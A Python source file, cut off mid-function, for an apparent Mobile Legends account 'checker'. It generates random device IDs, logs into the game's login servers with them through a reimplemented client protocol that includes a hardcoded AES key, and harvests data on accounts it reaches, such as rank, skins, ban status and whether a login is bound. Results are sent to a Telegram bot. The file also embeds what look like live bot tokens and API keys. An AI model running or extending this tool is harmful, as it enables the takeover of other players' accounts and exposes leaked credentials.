#!/usr/bin/env python3
# ===================================================================
#  ML CHECKER - PROFESSIONAL EDITION
#  F CHECK  : Login-only check (generated Device ID -> login -> HIT)
#  ALL CHECK: Full info pull (login -> game server -> all player data)
#  Features: Live Terminal | Auto-Save | Rank Filter | Skin Info
#            V2L Status | Moonton | Offline | Collector | Bot Mode
# ===================================================================

import os, sys, time, random, uuid, json, threading, socket, zlib, string
import zstandard as zstd, struct, re, requests, hashlib, base64
from queue import Queue
from enum import Enum
from typing import Tuple, Dict, Any, List, Optional, Callable
from Crypto.Cipher import AES
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone, timedelta
from collections import Counter

init(autoreset=True)

# ────────────────────────────────────────────────────────────────────
#  CONFIG
# ────────────────────────────────────────────────────────────────────

TZ_WIB = timezone(timedelta(hours=7))
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_DIR = os.path.join(BASE_DIR, "ML_CHECKER_OUTPUT")

# Telegram
TELEGRAM_BOT_TOKEN = "8950400071:AAERX1SIDYcH_b9kxUatj1B-x_SBLxYU5KE"
TELEGRAM_CHAT_ID    = "8353748526"

# API (checkton.online)
BAN_URL    = "https://checkton.online/backend/device_id"
INFO_URL   = "https://checkton.online/backend/info"
BAN_API_KEY    = "XdzVwcnvQAPhGXFbBhCuKfHRjMTFaDlEvSS7O2C7oMo"
INFO_API_KEY   = "XdzVwcnvQAPhGXFbBhCuKfHRjMTFaDlEvSS7O2C7oMo"
API_TIMEOUT    = 15

# Game Protocol
AES_KEY = bytes.fromhex('f5a193d50ade553e9835595f5cd75ddd')
AES_IV  = b'\x00' * 16
SERVER_HOST    = 'login.ml.youngjoygame.com'
SERVER_PORT    = 30021
CLIENT_VERSION = '2.1.99.1205.1'
CHANNEL        = 'and_usa'
LANGUAGE       = 'en'
AVG_BYTES_PER_LINE = 80

HEX_CHARS    = "0123456789abcdef"
BASE36_CHARS = string.ascii_lowercase + string.digits
BASE62_CHARS = string.ascii_letters + string.digits

CHECK_MODE = "DIRECT"
OEM_MODE   = "D"

DEEP_CHECK_RETRIES = 5
DEEP_CHECK_DELAY   = 2.0

# ────────────────────────────────────────────────────────────────────
#  OEM POOLS
# ────────────────────────────────────────────────────────────────────

OEM_A = "cd9e459ea708a948d5c2f5a6ca8838cf"

OEM_B_POOL = [
    "e9fbdb6c2be72123da4d703147c94b19","3587b169e45896db064559df2c2a8e8d",
    "1e526e21ef5d1a27c4cf4f6b8a414189","2ab86ae5177a1b24550529b69b95067c",
    "d7a1d0aca5b33c9d4c9c2f9ac3f8be61","369c13b29869edaa27e47898d2b65b47",
    "a084849de06078b102b94d9c9deef8fd","0870483ad2e1fc6a0e4f6f6cc630e29c",
    "50576dc1844743c995d7dc3f16335723","422619b9b2cf2285efbfc837c64e9a9e",
    "d8222fa96375675be4537fe928991558","63b2f0fcc15f91af05ebd30cdd14ec1b",
    "a6160fe063cefb54a52f4119f4040ec0","02e15c10b575b5aec2e12bc9277b3b2b",
    "5d8d38cf2aa97269d4817e8346fcfb3b","d520d6f4a4720fd656d4ff430dcf9c10",
    "105da1c5b46e67c2a597f58187dec33e","4bb140191d54f5137e0ef41766162ea7",
    "14ae3ce77963e5561bd60353edaf4536","5d259e7c802fc45dc12a1efd305ceafd",
    "0fdb59c757314ea8e31a9c66f54317ab","1e0d905e8d5f828d97a526163b932696",
    "40e556f652a6a463721e44692293d462","08025e85f6aa4900cbef1528319e364b",
    "9cfddaf3ac14fc3a30792f3bb69ee400","a2764e5b72810ea7cc9c8fb4518a64d3",
    "3d31bc455484137719f10f1fa49044b3","4966eacfb911d57953ebf9d2f59ef143",
    "3c704badf7f59efdf77ab3d27f1dc9c9","b58373c170e7d1115a2dc142bf626cf7",
    "2c7e65e68fb1f2f72f8004c5806249ac","cc4d4b384e63e9d171cd20b2cc0cbe98",
    "04962d868101d534001cf1a6532f4f0d","e2972fbf1eb41440ead1f399cd63c9ee",
    "0282451629b979420486f6019c63f0fc","4d94a0eeac46962913306922cdfcda9a",
    "78a9985504e01f892c4bdd8654dffb17","0a8643f8ba4849f6a458cba71b426e6a",
    "8219f2c6c7175e385272952c99da93e7","49c4461bc742eea93a0db7d4c0e671df",
    "5492850a24c6b9f1b7c137e55a3efff3","f427e3f2b66e2c732d21107ea0681ddb",
    "8f5905637bf676a17c7d49527dd30a2e","64835e1cfebd819fb5550e54a0be4325",
    "baf59ad603e9e859a948fdf53d359fb7","46aa9446b9d36a0e9b1de66b5cc33614",
    "bec525ac69bcd4db008b149112a2c5e3","78ab5fe0c80c34e2bc455e1949de1672",
    "6f4cab42a5f81ce509ebfb64f09d19c5","6519dc5c5ece0d5fe4879c5f188621e0",
    "e2633970fb4991fd27c6db415ed97b76","7b20a21ab9db463ea88c36c1a1ee6bf8",
    "9d076b3d41629c9a98cbe59852ef58e0","72ff99fa2732feff1121c63068b1ab0e",
    "4fc3edf64adf2b1029e0eebd4d169c87","8646fe1382e061e831f99aa321014912",
    "a939e4f4ecddfa0a8acbe41144b4139d","f9a2110483105e68727cabb86b569182",
    "14f1a761abe21a58a3ee65088f250ae5","58679e587c39d0f9819696812d41075a",
    "1b4a9cb4ec1dfb4e8f60dc6eb0018974","3d74cf946e711c0cd2d73420a9930b69",
    "4e8c29eb576290944fbe8833acd07b06",
]

OEM_C_POOL = [
    "b7f9a1c2d3e4f5061728394a5b6c7d8e","a1c8f304e792b516d8e0349acb1527fe",
    "f29c4815a73b06de1928475bc0d1e2f3","e50b12789f4ca3612d8e057cb4a193fe",
    "d41d8cd98f00b204e9800998ecf8427e",
]

def get_oem(mode=None):
    m = mode or OEM_MODE
    if m == "A": return OEM_A
    elif m == "B": return random.choice(OEM_B_POOL)
    elif m == "C": return random.choice(OEM_C_POOL)
    elif m == "MIX":
        return OEM_A if random.random() < 0.9 else random.choice(OEM_B_POOL)
    elif m == "MIX_ABC":
        r = random.random()
        if r < 0.70: return OEM_A
        elif r < 0.85: return random.choice(OEM_B_POOL)
        else: return random.choice(OEM_C_POOL)
    return OEM_A

# ────────────────────────────────────────────────────────────────────
#  FOLDERS
# ────────────────────────────────────────────────────────────────────

FOLDERS = {
    "generated":     "00_Generated",
    "f_check_hits":  "01_F_Check_Hits",
    "all_check":     "02_All_Check",
    "rank_warrior":  "04_Rank_Warrior",
    "rank_elite":    "05_Rank_Elite",
    "rank_master":   "06_Rank_Master",
    "rank_gm":       "07_Rank_Grandmaster",
    "rank_epic":     "08_Rank_Epic",
    "rank_legend":   "09_Rank_Epic",
    "rank_mythic":   "10_Rank_Mythic",
    "v2l_active":    "11_V2L_Active",
    "v2l_inactive":  "12_V2L_Inactive",
    "sultan":        "13_Sultan",
    "collector":     "14_Collector",
    "reports":       "16_Reports",
    "checkpoint":    "98_Checkpoints",
    "error":         "99_Error",
    "bot_uploads":   "20_Bot_Uploads",
}

def ensure_dirs():
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    for folder in FOLDERS.values():
        os.makedirs(os.path.join(OUTPUT_DIR, folder), exist_ok=True)
ensure_dirs()

FILES = {
    "generated_devices": os.path.join(OUTPUT_DIR, FOLDERS["generated"], "generated_devices.txt"),
    "f_check_hits":      os.path.join(OUTPUT_DIR, FOLDERS["f_check_hits"],  "f_check_hits.txt"),
    "all_check_hits":    os.path.join(OUTPUT_DIR, FOLDERS["all_check"],     "all_check_hits.txt"),
    "error_log":         os.path.join(OUTPUT_DIR, FOLDERS["error"],         "error_log.txt"),
    "hits_report":       os.path.join(OUTPUT_DIR, FOLDERS["reports"],       "hits_report.txt"),
    "bot_uploads":       os.path.join(OUTPUT_DIR, FOLDERS["bot_uploads"],   "bot_uploads.txt"),
}

# ────────────────────────────────────────────────────────────────────
#  BANNER
# ────────────────────────────────────────────────────────────────────

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    clear_screen()
    banner = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════╗
{Fore.RED}║                                                              ║
{Fore.RED}║   {Fore.YELLOW}███╗   ███╗██╗██╗   ██╗███╗   ███╗{Fore.RED}                        ║
{Fore.RED}║   {Fore.YELLOW}████╗ ████║██║██║   ██║████╗ ████║{Fore.RED}                        ║
{Fore.RED}║   {Fore.YELLOW}██╔████╔██║██║██║   ██║██╔████╔██║{Fore.RED}                        ║
{Fore.RED}║   {Fore.YELLOW}██║╚██╔╝██║██║██║   ██║██║╚██╔╝██║{Fore.RED}                        ║
{Fore.RED}║   {Fore.YELLOW}██║ ╚═╝ ██║██║╚██████╔╝██║ ╚═╝ ██║{Fore.RED}                        ║
{Fore.RED}║   {Fore.YELLOW}╚═╝     ╚═╝╚═╝ ╚═════╝ ╚═╝     ╚═╝{Fore.RED}                        ║
{Fore.RED}║                                                              ║
{Fore.RED}║              {Fore.CYAN}═══  ML CHECKER  ═══{Fore.RED}                      ║
{Fore.RED}║              {Fore.GREEN}═══  PRO EDITION  ═══{Fore.RED}                     ║
{Fore.RED}╚══════════════════════════════════════════════════════════════╝
{Fore.LIGHTBLACK_EX}  OEM Mode : {Fore.GREEN}{OEM_MODE}{Fore.LIGHTBLACK_EX}  |  Check Mode : {Fore.GREEN}{CHECK_MODE}{Fore.LIGHTBLACK_EX}
{Style.RESET_ALL}
"""
    print(banner)

def print_header(title=""):
    print_banner()
    if title:
        print(f"{Fore.CYAN}╔{'═'*58}╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Fore.WHITE}{title.center(58)}{Fore.CYAN}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚{'═'*58}╝{Style.RESET_ALL}\n")

# ────────────────────────────────────────────────────────────────────
#  TELEGRAM
# ────────────────────────────────────────────────────────────────────

def send_telegram(message: str) -> bool:
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return False
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        resp = requests.post(url, json={
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }, timeout=10)
        return resp.status_code == 200
    except Exception:
        return False

def send_telegram_document(file_path: str, caption: str = "") -> bool:
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return False
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption, 'parse_mode': 'HTML'}
            resp = requests.post(url, data=data, files=files, timeout=60)
        return resp.status_code == 200
    except Exception as e:
        print(f"{Fore.RED}TG doc error: {e}{Style.RESET_ALL}")
        return False

_tg_cache = set()
_tg_lock  = threading.Lock()

def send_telegram_once(device_id: str, message: str) -> bool:
    with _tg_lock:
        if device_id in _tg_cache:
            return False
        _tg_cache.add(device_id)
    success = send_telegram(message)
    with _tg_lock:
        if len(_tg_cache) > 10000:
            _tg_cache.clear()
    return success

def get_telegram_updates(offset=None, timeout=30):
    if not TELEGRAM_BOT_TOKEN:
        return []
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
        params = {"timeout": timeout, "allowed_updates": ["message", "document"]}
        if offset:
            params["offset"] = offset
        resp = requests.get(url, params=params, timeout=timeout + 5)
        if resp.status_code == 200:
            data = resp.json()
            return data.get("result", [])
    except Exception:
        pass
    return []

def download_telegram_file(file_id: str, dest_path: str) -> bool:
    if not TELEGRAM_BOT_TOKEN:
        return False
    try:
        get_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getFile"
        resp = requests.get(get_url, params={"file_id": file_id}, timeout=15)
        if resp.status_code != 200:
            return False
        file_path = resp.json().get("result", {}).get("file_path")
        if not file_path:
            return False
        dl_url = f"https://api.telegram.org/file/bot{TELEGRAM_BOT_TOKEN}/{file_path}"
        dl_resp = requests.get(dl_url, timeout=30)
        if dl_resp.status_code == 200:
            with open(dest_path, 'wb') as f:
                f.write(dl_resp.content)
            return True
    except Exception:
        pass
    return False

_telegram_listen_running = False
_telegram_listen_lock = threading.Lock()
_telegram_last_update_id = 0
_telegram_stop_event = threading.Event()
_telegram_thread = None

def listen_for_telegram_uploads(stop_event: threading.Event):
    global _telegram_last_update_id
    uploads_dir = FILES["bot_uploads"]
    os.makedirs(os.path.dirname(uploads_dir), exist_ok=True)
    while not stop_event.is_set():
        try:
            updates = get_telegram_updates(offset=_telegram_last_update_id + 1, timeout=5)
            for update in updates:
                update_id = update.get("update_id", 0)
                if update_id > _telegram_last_update_id:
                    _telegram_last_update_id = update_id
                msg = update.get("message", {})
                doc = msg.get("document")
                if doc and TELEGRAM_CHAT_ID:
                    chat_id = msg.get("chat", {}).get("id")
                    if str(chat_id) == str(TELEGRAM_CHAT_ID):
                        file_id = doc.get("file_id")
                        file_name = doc.get("file_name", "upload.txt")
                        dest_path = os.path.join(os.path.dirname(uploads_dir), f"tg_upload_{int(time.time())}_{file_name}")
                        if download_telegram_file(file_id, dest_path):
                            with open(uploads_dir, "a", encoding='utf-8') as f:
                                f.write(f"\n# Telegram upload: {file_name}\n")
                                with open(dest_path, 'r', encoding='utf-8', errors='ignore') as src:
                                    f.write(src.read())
                            send_telegram(f"✅ File received: {file_name}\nSaved to uploads.")
                        else:
                            send_telegram(f"❌ Failed to download: {file_name}")
        except Exception:
            time.sleep(1)
    _telegram_listen_running = False

# ────────────────────────────────────────────────────────────────────
#  GLOBAL STATE
# ────────────────────────────────────────────────────────────────────

HIT_COUNTERS = {
    'f_check': 0, 'all_check': 0, 'banned': 0, 'error': 0,
    'warrior': 0, 'elite': 0, 'master': 0, 'gm': 0,
    'epic': 0, 'legend': 0, 'mythic': 0,
    'v2l_active': 0, 'v2l_inactive': 0,
    'sultan': 0,
    'collector_amateur': 0, 'collector_junior': 0, 'collector_senior': 0,
    'collector_expert': 0, 'collector_renowned': 0,
    'collector_exalted': 0, 'collector_mega': 0, 'collector_sultan': 0,
}
COUNTER_LOCK = threading.Lock()
SAVE_LOCK    = threading.Lock()

HIT_LIST: List[Dict] = []
HIT_LIST_LOCK = threading.Lock()

LIVE_STATS = {
    'checked': 0, 'hits': 0, 'banned': 0, 'invalid': 0,
    'errors': 0, 'start_time': 0, 'lock': threading.Lock()
}

# ────────────────────────────────────────────────────────────────────
#  SDP PROTOCOL
# ────────────────────────────────────────────────────────────────────

class SdpDataType(Enum):
    INTEGER_POSITIVE = 0
    INTEGER_NEGATIVE = 1
    FLOAT = 2
    DOUBLE = 3
    STRING = 4
    LIST = 5
    DICT = 6
    STRUCT_BEGIN = 7
    STRUCT_END = 8

class SdpStruct(dict):
    def __init__(self, data=None):
        super().__init__()
        self.data = b''
        self.offset = 0
        if isinstance(data, bytes):
            self.data = data
            self._unpack()
        elif data is not None:
            self.update(data)
            self._pack()

    def _pack(self):
        self.data = bytes([SdpDataType.STRUCT_BEGIN.value << 4])
        for k, v in sorted(self.items()):
            self._pack_item(k, v)
        self.data += bytes([SdpDataType.STRUCT_END.value << 4])

    def _unpack(self):
        if not self.data: return
        if self.data[0] >> 4 == SdpDataType.STRUCT_BEGIN.value:
            self.offset = 1
        while self.offset < len(self.data):
            k, v = self._unpack_item()
            if isinstance(v, SdpDataType) and v == SdpDataType.STRUCT_END:
                break
            self[k] = v

    def _write_varint(self, n: int) -> bytes:
        res = bytearray()
        while n >= 0x80:
            res.append((n & 0x7F) | 0x80)
            n >>= 7
        res.append(n & 0x7F)
        return bytes(res)

    def _read_varint(self) -> int:
        n = 1
        val = self.data[self.offset] & 0x7F
        while self.data[self.offset + n - 1] >= 0x80:
            val |= (self.data[self.offset + n] & 0x7F) << (7 * n)
            n += 1
        self.offset += n
        return val

    def _pack_header(self, tag: int, dtype: SdpDataType):
        if tag < 15:
            self.data += bytes([(dtype.value << 4) | tag])
        else:
            self.data += bytes([(dtype.value << 4) | 15]) + self._write_varint(tag)

    def _pack_item(self, tag: int, val: Any):
        if isinstance(val, bool):
            self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
            self.data += self._write_varint(1 if val else 0)
        elif isinstance(val, int):
            if val < 0:
                self._pack_header(tag, SdpDataType.INTEGER_NEGATIVE)
                self.data += self._write_varint(-val)
            else:
                self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
                self.data += self._write_varint(val)
        elif isinstance(val, float):
            self._pack_header(tag, SdpDataType.DOUBLE)
            self.data += self._write_varint(8) + struct.pack("<d", val)
        elif isinstance(val, (str, bytes)):
            self._pack_header(tag, SdpDataType.STRING)
            enc = val.encode('utf-8') if isinstance(val, str) else val
            self.data += self._write_varint(len(enc)) + enc
        elif isinstance(val, list):
            self._pack_header(tag, SdpDataType.LIST)
            self.data += self._write_varint(len(val))
            for item in val: self._pack_item(0, item)
        elif isinstance(val, dict):
            if isinstance(val, SdpStruct):
                self._pack_header(tag, SdpDataType.STRUCT_BEGIN)
                for k, v in sorted(val.items()): self._pack_item(k, v)
                self.data += bytes([SdpDataType.STRUCT_END.value << 4])
            else:
                self._pack_header(tag, SdpDataType.DICT)
                self.data += self._write_varint(len(val))
                for k, v in sorted(val.items()):
                    self._pack_item(0, k)
                    self._pack_item(0, v)
        else:
            raise Exception("Unsupported type")

    def _unpack_item(self) -> Tuple[int, Any]:
        if self.offset >= len(self.data): return 0, None
        hdr = self.data[self.offset]
        tag = hdr & 0xF
        dtype = SdpDataType(hdr >> 4)
        self.offset += 1
        if tag == 15: tag = self._read_varint()
        if dtype == SdpDataType.INTEGER_POSITIVE: return tag, self._read_varint()
        if dtype == SdpDataType.INTEGER_NEGATIVE: return tag, -self._read_varint()
        if dtype == SdpDataType.FLOAT:
            return tag, struct.unpack("<f", self._read_varint().to_bytes(4, 'little'))[0]
        if dtype == SdpDataType.DOUBLE:
            return tag, struct.unpack("<d", self._read_varint().to_bytes(8, 'little'))[0]
        if dtype == SdpDataType.STRING:
            l = self._read_varint()
            raw = self.data[self.offset:self.offset + l]
            self.offset += l
            try: return tag, raw.decode('utf-8')
            except: return tag, raw
        if dtype == SdpDataType.LIST:
            l = self._read_varint()
            return tag, [self._unpack_item()[1] for _ in range(l)]
        if dtype == SdpDataType.DICT:
            l = self._read_varint()
            res = {}
            for _ in range(l):
                _, k = self._unpack_item()
                _, v = self._unpack_item()
                res[k] = v
            return tag, res
        if dtype == SdpDataType.STRUCT_BEGIN:
            res = {}
            while True:
                k, v = self._unpack_item()
                if isinstance(v, SdpDataType) and v == SdpDataType.STRUCT_END: break
                res[k] = v
            return tag, SdpStruct(res)
        if dtype == SdpDataType.STRUCT_END: return tag, SdpDataType.STRUCT_END
        raise Exception("Unknown data type")

# ────────────────────────────────────────────────────────────────────
#  CONNECTION
# ────────────────────────────────────────────────────────────────────

class BaseConnection:
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.sequence = 1
        self.socket = None
        self.queue = b''

    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.host, self.port))
        self.socket.settimeout(10)

    def cleanup(self):
        if self.socket:
            try: self.socket.close()
            except: pass
            self.sequence = 1
            self.socket = None

    def __enter__(self):
        self.connect()
        return self

    def __exit__(self, *args):
        self.cleanup()

    def send_data(self, pid: int, sdp: SdpStruct):
        pkt = SdpStruct({0: pid, 1: self.sequence, 5: sdp.data}).data
        comp = zstd.compress(pkt)
        flags = (len(comp) + 4) | (16 << 24)
        self.socket.send(flags.to_bytes(4, 'big') + comp)
        self.sequence += 1

    def recv_data(self) -> Tuple[Optional[int], Optional[SdpStruct]]:
        try:
            while len(self.queue) < 4:
                d = self.socket.recv(4096)
                if not d: return None, None
                self.queue += d
            flags = int.from_bytes(self.queue[:4], 'big')
            size = flags & 0xFFFFFF
            ctype = flags >> 24
            while len(self.queue) < size:
                d = self.socket.recv(4096)
                if not d: return None, None
                self.queue += d
            data = self.queue[4:size]
            self.queue = self.queue[size:]
            if ctype == 1: data = zlib.decompress(data)
            elif ctype == 16: data = zstd.decompress(data)
            elif ctype in (2, 3, 18):
                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                data = cipher.decrypt(data[:-1] if len(data) % 16 else data).rstrip(b'\x00')
                if ctype == 3: data = zlib.decompress(data)
                elif ctype == 18: data = zstd.decompress(data)
            res = SdpStruct(data)
            pid = res.get(0)
            if pid is None: return None, None
            body = res.get(6) or res.get(5)
            return (pid, SdpStruct(body)) if body and isinstance(body, bytes) else (pid, None)
        except socket.timeout: return -1, None
        except: return None, None

class GameLogin(BaseConnection):
    def __init__(self, device_id: str):
        super().__init__(SERVER_HOST, SERVER_PORT)
        self.device_id = device_id
        raw = device_id.strip()
        if raw.startswith(("and_", "ios_")):
            raw = raw[4:]
        self.imei = raw[:32] if len(raw) >= 32 else raw
        self.android = raw[32:48] if len(raw) >= 48 else ""
        self.adid = raw[48:] if len(raw) > 48 else ""

    def run(self) -> Tuple[Optional[int], Optional[int], str]:
        try:
            self.connect()
            self.send_data(1, SdpStruct({
                0: self.device_id,
                1: f'gps_adid={self.adid}&android_id={self.android}&device_unique_id={self.imei}',
                2: CLIENT_VERSION, 3: CHANNEL, 4: LANGUAGE
            }))
            pid, res = self.recv_data()
            if pid == 2 and res:
                return res.get(0), (res[2][0] if 2 in res else None), "NORMAL"
            return None, None, f"FAIL (PID: {pid})"
        except Exception as e:
            return None, None, f"ERROR ({e})"
        finally:
            self.cleanup()

class GameConnection(BaseConnection):
    def __init__(self, device_id: str):
        super().__init__(SERVER_HOST, SERVER_PORT)
        self.device_id = device_id
        raw = device_id.strip()
        if raw.startswith(("and_", "ios_")):
            raw = raw[4:]
        self.imei = raw[:32] if len(raw) >= 32 else raw
        self.android = raw[32:48] if len(raw) >= 48 else ""
        self.adid = raw[48:] if len(raw) > 48 else ""
        self.account_id = 0
        self.session_key = ''
        self.zone_id = 0
        self.game_host = ''
        self.game_port = 0
        self.creation_ts = 0
        self.ban_status = "NORMAL"

    def login_to_login_server(self) -> bool:
        if not self.socket or self.host != SERVER_HOST:
            self.cleanup()
            self.host, self.port = SERVER_HOST, SERVER_PORT
            self.connect()
        self.send_data(1, SdpStruct({
            0: self.device_id,
            1: f'gps_adid={self.adid}&android_id={self.android}&device_unique_id={self.imei}',
            2: CLIENT_VERSION, 3: CHANNEL, 4: 'en'
        }))
        pid, res = self.recv_data()
        if pid == 2 and res:
            self.account_id = res.get(0)
            self.session_key = res[1]
            self.zone_id = res[2][0]
            self.creation_ts = res.get(19, 0)
            self.ban_status = "NORMAL"
            return True
        self.ban_status = f"LOGIN FAILED (PID: {pid})"
        return False

    def get_game_server(self) -> bool:
        self.send_data(5, SdpStruct({
            0: self.account_id, 1: self.session_key, 2: CLIENT_VERSION, 5: self.zone_id, 6: CHANNEL
        }))
        pid, res = self.recv_data()
        if pid == 6 and res:
            host, port = res[1].split(':')
            self.game_host = host
            self.game_port = int(port)
            return True
        return False

    def connect_to_game_server(self) -> bool:
        self.cleanup()
        self.host, self.port = self.game_host, self.game_port
        self.connect()
        self.send_data(10001, SdpStruct({
            0: self.account_id, 1: self.session_key, 2: self.zone_id, 4: CLIENT_VERSION, 13: CHANNEL, 15: self.device_id
        }))
        for _ in range(5):
            pid, res = self.recv_data()
            if pid == 10002: return True
            if pid in (-1, None): break
        return False

    def check_ban_status(self) -> str:
        self.send_data(10101, SdpStruct({0: 0, 2: 2}))
        for _ in range(3):
            pid, res = self.recv_data()
            if pid == 20001 and res and isinstance(res, dict) and 0 in res and isinstance(res[0], dict):
                binfo = res[0]
                reason = binfo.get('ban_reason', 'Unknown')
                self.ban_status = f"BANNED ({reason})"
                return self.ban_status
            if pid in (-1, None, 20002): break
        return self.ban_status

    def lookup_player(self, search_value: int):
        self.send_data(11153, SdpStruct({1: int(search_value)}))
        cnt = 0
        for _ in range(8):
            pid, res = self.recv_data()
            if pid in (-1, None): return None
            if pid == 11154: return res
            if pid == 20001:
                cnt += 1
                if cnt >= 2: return None
        return None

    def get_role_info(self, role_id: int, zone_id: int):
        self.send_data(10128, SdpStruct({1: int(role_id), 2: int(zone_id)}))
        for _ in range(4):
            pid, res = self.recv_data()
            if pid in (-1, None): break
            if pid == 10129: return res
        return None

    def get_skin_role_info(self, role_id: int, zone_id: int):
        self.send_data(10143, SdpStruct({0: int(role_id), 1: int(zone_id)}))
        for _ in range(4):
            pid, res = self.recv_data()
            if pid in (-1, None): break
            if pid == 10144: return res
        return None

# ────────────────────────────────────────────────────────────────────
#  RANK / V2L / MOONTON / OFFLINE / COLLECTOR HELPERS
# ────────────────────────────────────────────────────────────────────

def map_rank(p) -> str:
    if not p or not isinstance(p, (int, float)) or p <= 0:
        return "Unranked"
    p = int(p)
    if p >= 136:
        stars = p - 136
        if stars >= 100: return f"Mythical Immortal ({stars}★)"
        if stars >= 50:  return f"Mythical Glory ({stars}★)"
        if stars >= 25:  return f"Mythical Honor ({stars}★)"
        return f"Mythic ({stars}★)"
    ranks = [
        (105, "Legend",        5, ["V","IV","III","II","I"]),
        (75,  "Epic",          5, ["V","IV","III","II","I"]),
        (45,  "Grandmaster",   5, ["V","IV","III","II","I"]),
        (25,  "Master",        4, ["IV","III","II","I"]),
        (10,  "Elite",         3, ["IV","III","II","I"]),
        (1,   "Warrior",       3, ["III","II","I"]),
    ]
    for threshold, name, div_stars, div_names in ranks:
        if p >= threshold:
            offset = p - threshold
            div_idx = min(len(div_names) - 1, offset // div_stars)
            star = (offset % div_stars) + 1
            return f"{name} {div_names[div_idx]} ({star}★)"
    return "Warrior III (1★)"

def get_rank_category(rank_text: str) -> str:
    rt = rank_text.lower()
    if "warrior" in rt:     return "warrior"
    if "elite" in rt:       return "elite"
    if "grandmaster" in rt: return "gm"
    if "master" in rt and "grand" not in rt: return "master"
    if "epic" in rt:        return "epic"
    if "legend" in rt:      return "legend"
    if "mythic" in rt or "immortal" in rt or "glory" in rt or "honor" in rt:
        return "mythic"
    return "other"

def get_stars_from_rank(rank_text: str) -> int:
    match = re.search(r'\((\d+)★\)', rank_text)
    return int(match.group(1)) if match else 0

def get_v2l_status(conn, role_id: int, zone_id: int) -> str:
    try:
        conn.send_data(10208, SdpStruct({0: int(role_id), 1: int(zone_id)}))
        for _ in range(3):
            pid, res = conn.recv_data()
            if pid in (-1, None): break
            if pid == 10208 and res:
                data = dict(res)
                for tag in [10, 11, 13, 14, 15, 0, 2, 3, 5, 20, 21]:
                    val = data.get(tag)
                    if val is not None and isinstance(val, (int, float)):
                        return "Enabled" if int(val) > 0 else "Disabled"
    except Exception:
        pass
    return "N/A"

def get_moonton_status(conn, role_id: int, zone_id: int) -> Dict[str, str]:
    result = {'mt': 'clear', 'mt_mail': 'clear', 'third_party': 'clear'}
    for pid_send, pid_recv in [(10214, 10215), (10178, 10179)]:
        try:
            conn.send_data(pid_send, SdpStruct({0: int(role_id), 1: int(zone_id)}))
            for _ in range(3):
                pid, res = conn.recv_data()
                if pid in (-1, None): break
                if pid == pid_recv and res:
                    d = dict(res)
                    result['mt']         = 'bound' if (d.get(1) or d.get(10) or d.get(20)) else 'clear'
                    result['mt_mail']    = 'bound' if (d.get(2) or d.get(11) or d.get(21)) else 'clear'
                    result['third_party']= 'bound' if (d.get(3) or d.get(4) or d.get(5) or d.get(12)) else 'clear'
                    return result
        except Exception:
            pass
    return result

def compute_offline_info(last_online_ts) -> Dict[str, Any]:
    now_utc = datetime.now(timezone.utc)
    if not last_online_ts or not isinstance(last_online_ts, (int, float)) or last_online_ts <= 0:
        return {'offline_days': 'N/A', 'last_online': 'N/A', 'raw_days': 0}
    try:
        last_dt = datetime.fromtimestamp(int(last_online_ts), tz=timezone.utc)
        delta = now_utc - last_dt
        days  = int(delta.total_seconds() // 86400)
        hours = int((delta.total_seconds() % 86400) // 3600)
        last_wib = last_dt.astimezone(TZ_WIB).strftime('%Y-%m-%d %H:%M:%S WIB')
        if days > 0:   offline = f"{days} days"
        elif hours > 0: offline = f"{hours} hours"
        else:           offline = f"{int((delta.total_seconds() % 3600) // 60)} minutes"
        return {'offline_days': offline, 'last_online': last_wib, 'raw_days': days}
    except Exception:
        return {'offline_days': 'N/A', 'last_online': 'N/A', 'raw_days': 0}

COLLECTOR_LEVELS = [
    (280000, "Sultan Collector"),  (160000, "Mega Collector"),
    (84000,  "Exalted Collector"), (44000,  "Renowned Collector"),
    (22000,  "Expert Collector"),  (10000,  "Senior Collector"),
    (4000,   "Junior Collector"),  (1000,   "Amateur Collector"),
]

def get_collector_level(points: int) -> str:
    if not points or points <= 0: return "None"
    for threshold, name in COLLECTOR_LEVELS:
        if points >= threshold: return name
    return "None"

def get_collector_category(level: str) -> Optional[str]:
    l = level.lower()
    if "sultan" in l:   return "collector_sultan"
    if "mega" in l:     return "collector_mega"
    if "exalted" in l:  return "collector_exalted"
    if "renowned" in l: return "collector_renowned"
    if "expert" in l:   return "collector_expert"
    if "senior" in l:   return "collector_senior"
    if "junior" in l:   return "collector_junior"
    if "amateur" in l:  return "collector_amateur"
    return None

# ────────────────────────────────────────────────────────────────────
#  DEVICE GENERATOR
# ────────────────────────────────────────────────────────────────────

def random_hex(n):   return ''.join(random.choices(HEX_CHARS, k=n))
def random_base36(n):return ''.join(random.choices(BASE36_CHARS, k=n))
def random_base62(n):return ''.join(random.choices(BASE62_CHARS, k=n))
def uuid4_str():     return str(uuid.uuid4())
def uuid4_upper():   return str(uuid.uuid4()).upper()

def random_gaid():
    return f"{random_hex(8)}-{random_hex(4)}-{random_hex(4)}-{random_hex(4)}-{random_hex(12)}"

def random_android_id(): return random_hex(16)

def random_imei():
    def luhn(digits):
        total = 0
        for i, d in enumerate(reversed(digits)):
            n = int(d)
            if i % 2 == 0:
                n *= 2
                if n > 9: n -= 9
